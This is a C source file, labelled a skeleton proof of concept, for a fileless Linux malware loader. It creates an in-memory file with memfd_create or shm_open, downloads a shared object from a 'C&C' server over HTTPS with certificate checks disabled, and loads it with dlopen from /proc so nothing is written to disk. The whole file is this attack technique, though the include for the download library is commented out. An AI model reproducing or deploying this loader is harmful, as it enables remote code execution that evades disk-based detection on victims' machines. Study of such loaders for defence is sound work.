/* Skeleton PoC */

#define _GNU_SOURCE


//#include <curl/curl.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/stat.h>        /* For mode constants */
#include <fcntl.h>           /* For O_* constants */

#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>



#define SHM_NAME "IceIceBaby"
#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html


// Wrapper to call memfd_create syscall
static inline int memfd_create(const char *name, unsigned int flags) {
	return syscall(__NR_memfd_create, name, flags);
}

// Detect if kernel is < or => than 3.17
// Ugly as hell, probably I was drunk when I coded it
int kernel_version() {
	struct utsname buffer;
	uname(&buffer);
	
	char *token;
	const char *separator = ".";
	
	token = strtok(buffer.release, separator);
	if (atoi(token) < 3) {
		return 0;
	}
	else if (atoi(token) > 3){
		return 1;
	}

	token = strtok(NULL, separator);
	if (atoi(token) < 17) {
		return 0;
	}
	else {
		return 1;
	}
}


// Returns a file descriptor where we can write our shared object
int open_ramfs(void) {
	int shm_fd;

	//If we have a kernel < 3.17
	// We need to use the less fancy way
	if (kernel_version() == 0) {
		shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[-] Could not open file descriptor\n");
			exit(-1);
		}
	}
	// If we have a kernel >= 3.17
	// We can use the funky style
	else {
		shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0) { //Something went wrong :(
			fprintf(stderr, "[- Could not open file descriptor\n");
			exit(-1);
		}
	}
	return shm_fd;
}

// Callback to write the shared object
size_t write_data (void *ptr, size_t size, size_t nmemb, int shm_fd) {
	if (write(shm_fd, ptr, nmemb) < 0) {
		fprintf(stderr, "[-] Could not write file :'(\n");
		close(shm_fd);
		exit(-1);
	}
	printf("[+] File written!\n");
}

// Download our share object from a C&C via HTTPs
int download_to_RAM(char *download) { 
	CURL *curl;
	CURLcode res;
	int shm_fd;

	shm_fd = open_ramfs(); // Give me a file descriptor to memory
	printf("[+] File Descriptor Shared Memory created!\n");
	
	// We use cURL to download the file
	// It's easy to use and we avoid to write unnecesary code
	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, download);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Too lazy to search for one");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, shm_fd); //Args for our callback
		
		// Do the HTTPs request!
		res = curl_easy_perform(curl);
		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
			fprintf(stderr, "[-] cURL failed: %s\n", curl_easy_strerror(res));
			close(shm_fd);
			exit(-1);
		}
		curl_easy_cleanup(curl);
		return shm_fd;
	}
}

// Load the shared object
void load_so(int shm_fd) {
	char path[1024];
	void *handle;

	printf("[+] Trying to load Shared Object!\n");
	if (kernel_version() == 1) { //Funky way
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else { // Not funky way :(
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	}
	handle = dlopen(path, RTLD_LAZY);
	if (!handle) {
		fprintf(stderr,"[-] Dlopen failed with error: %s\n", dlerror());
	}
}

int main (int argc, char **argv) {
	char *url = "https://localhost:4443/module1.so";
	int fd;

	printf("[+] Trying to reach C&C & start download...\n");
	fd = download_to_RAM(url);
	load_so(fd);
	exit(0);
}